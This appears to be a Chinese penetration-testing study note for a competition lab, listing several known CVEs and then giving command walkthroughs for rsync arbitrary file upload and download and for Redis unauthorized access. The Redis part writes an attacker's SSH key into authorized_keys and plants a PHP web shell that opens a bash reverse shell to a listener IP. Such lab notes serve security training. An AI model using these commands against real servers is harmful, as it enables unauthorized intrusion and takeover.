![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image105.png){width="5.760416666666667in"
height="4.784074803149606in"}

漏洞成功

CVE-2017-8464

漏洞影响上限是windows10不过会被杀毒杀掉

[震网三代CVE-2017-8464漏洞复现 - 知乎
(zhihu.com)](https://zhuanlan.zhihu.com/p/101608776)

P9写的不咋地

CVE-2016-5195

**漏洞危害：**

低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权

**影响范围**：

Linux内核\>=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复。

P9写的不咋地

CVE-2015-0240

漏洞实现Samba远程代码执行

P9环境的不咋地

CVE-2012-2122

漏洞影响** **

All MariaDB and MySQL versions up to** 5.1.61, 5.2.11, 5.3.5,
5.5.22** are vulnerable.

MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.

MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.

漏洞绕过mysql身份认证

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image106.png){width="5.760416666666667in"
height="3.4245286526684167in"}

P9环境的不咋地

**ms03-026**

漏洞介绍：Microsoft Windows
DCOM [RPC](https://so.csdn.net/so/search?q=RPC&spm=1001.2101.3001.7020)接口长主机名远程缓冲区溢出漏洞。
使用DCOM接口的Windows RPC 服务器

s03-026漏洞就是利用的135这个端口,135端口开启

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image107.png){width="5.760416666666667in"
height="3.364226815398075in"}

rsync任意上传

rsync -av crontab1 rsync:*//192.168.0.113:873/src/etc/crontab1//rsync
-av 文件路径 rsync://ip:873/目标系统文件路径*

rsync任意下载文件

rsync -av rsync://\<ip\>:\<port\>/src/etc/passwd /

**redis未授权访问漏洞进行提权**

影响版本：

Redis 2.x，3.x，4.x，5.x (比赛开启这个端口就相当于有这个漏洞) 6379端

**[在 Redis 中使用哪个命令来选择所需的数据库？]{.mark}**

**[select]{.mark}**

**不需校验直接就可以连接redis,存在Redis未授权访问漏洞。**

**nmap -p\* -sV -T4 172.16.1.124**

**使用kali进入/root/.ssh创建ssh-keyget -t rsa**

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image108.png){width="5.236111111111111in"
height="3.942729658792651in"}

**使用命令**(echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") \>
key.txt #将共钥写入key.txt加"\\n\\n"以防混淆

使用cat /root/key.txt \| redis-cli -h 172.16.1.124 -x set xxx
#将文件命名为xxx

连接靶机 redis-cli -h 172.16.1.124

方法一：

更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）

并设置上传公钥的备份文件名字为authorized_keys：

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image109.png){width="5.760416666666667in"
height="2.8077504374453195in"}

**使用ssh -i id_rsa
[[root@172.16.1.124]{.underline}](http://root@172.16.1.124)**

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image110.png){width="5.760416666666667in"
height="1.698584864391951in"}

**公钥连接报错**

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image111.png){width="5.760416666666667in"
height="0.769248687664042in"}

解决方法：

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image112.png){width="5.760416666666667in"
height="2.6407305336832896in"}

**方法二如果当公钥被拒绝登录可以**

**写入反弹文件，访问就反弹，后寻找提权方法**

**config set dir /var/www/html**

**config set dbfilename 1.php**

**set xxx \"\<?php system(\"**bash -i \>& /dev/tcp/172.16.123.123/4444
0\>&1**\")?\>\"**

**方法三：**

**使用命令**(echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") \>
key.txt #将共钥写入key.txt加"\\n\\n"以防混淆

然后使用msf

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image113.png){width="0.0in"
height="0.0in"}

![截图.png](D:\tools\Tools\Obsidian\sjqyyds\sjqyyds17\附件\渗透/media/image114.png){width="4.833333333333333in"
height="0.8541666666666666in"}
